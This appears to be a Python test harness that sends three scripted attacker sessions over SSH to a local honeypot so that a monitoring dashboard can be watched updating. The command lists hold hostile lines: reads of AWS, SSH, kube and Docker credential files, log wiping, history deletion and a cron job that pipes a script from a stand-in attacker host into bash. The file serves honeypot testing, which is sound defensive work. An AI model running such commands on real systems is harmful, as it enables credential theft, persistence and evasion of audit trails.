"""Drive three sequential attacker sessions against the local Plenith
honeypot so the dashboard's live-update path can be observed end-to-end.

Each session uses a different persona + behavior profile so the three
engagement rows look meaningfully distinct in the dashboard:

  1. jdoe     — credential thief (AWS keys, sudoers, .bash_history)
  2. agarcia  — lateral mover    (ssh keys, kubectl probes, ~/.docker)
  3. mwilson  — log tamperer     (clear logs, cron persistence, history wipe)

A short delay between commands gives the operator time to watch the
SSE ticks paint each new command + alert into the dashboard.
"""
from __future__ import annotations

import asyncio
import sys

import asyncssh


SESSIONS: list[tuple[str, list[str]]] = [
    ("jdoe", [
        "whoami",
        "id",
        "sudo -l",
        "cat /etc/sudoers.d/zzz_compat",
        "cat ~/.aws/credentials",
        "cat ~/.ssh/id_rsa",
        "history",
        "exit",
    ]),
    ("agarcia", [
        "whoami",
        "hostname",
        "kubectl get pods --all-namespaces",
        "cat ~/.kube/config",
        "ls ~/.docker",
        "cat ~/.docker/config.json",
        "ssh -i ~/.ssh/deploy_key prod-jumphost",
        "ssh root@db-prod-01",
        "exit",
    ]),
    ("mwilson", [
        "whoami",
        "cat /var/log/auth.log",
        "tail -n 200 /var/log/syslog",
        "echo > /var/log/auth.log",
        "crontab -l",
        "echo '* * * * * curl http://attacker.evil/shell.sh | bash' | crontab -",
        "rm ~/.bash_history",
        "ln -sf /dev/null ~/.bash_history",
        "exit",
    ]),
]


async def run_session(user: str, commands: list[str], cmd_delay: float = 4.0) -> None:
    """Drive one SSH session, typing commands with a small delay so the
    dashboard's 3-second SSE tick has time to redraw between commands."""
    print(f"[{user}] connecting…", flush=True)
    try:
        # `password=""` works because the honeypot accepts the first auth
        # attempt regardless of credential value.
        async with asyncssh.connect(
            "127.0.0.1",
            port=2222,
            username=user,
            password="any-password",
            known_hosts=None,
            client_keys=None,
        ) as conn:
            print(f"[{user}] authed; starting interactive PTY", flush=True)
            async with conn.create_process(term_type="xterm", encoding="utf-8") as proc:
                # Drain banner
                await asyncio.sleep(0.5)
                for cmd in commands:
                    print(f"[{user}] $ {cmd}", flush=True)
                    proc.stdin.write(cmd + "\n")
                    await proc.stdin.drain()
                    if cmd in ("exit", "logout", "quit"):
                        break
                    await asyncio.sleep(cmd_delay)
                # Wait for the process to fully exit (server-side close)
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5)
                except asyncio.TimeoutError:
                    pass
            print(f"[{user}] disconnected", flush=True)
    except Exception as e:
        print(f"[{user}] FAILED: {e}", flush=True)


async def main() -> None:
    # Tuned for the LM-Studio LLM round-trip (~1-2s per cached miss);
    # 4s gives each command time to flush + the dashboard's 3s SSE tick
    # time to paint the new row in the timeline before the next command.
    cmd_delay = float(sys.argv[1]) if len(sys.argv) > 1 else 4.0
    between_sessions = 6.0
    for user, commands in SESSIONS:
        await run_session(user, commands, cmd_delay=cmd_delay)
        print(f"--- waiting {between_sessions}s before next session ---", flush=True)
        await asyncio.sleep(between_sessions)
    print("done — three engagements should now appear in the dashboard.",
          flush=True)


if __name__ == "__main__":
    asyncio.run(main())
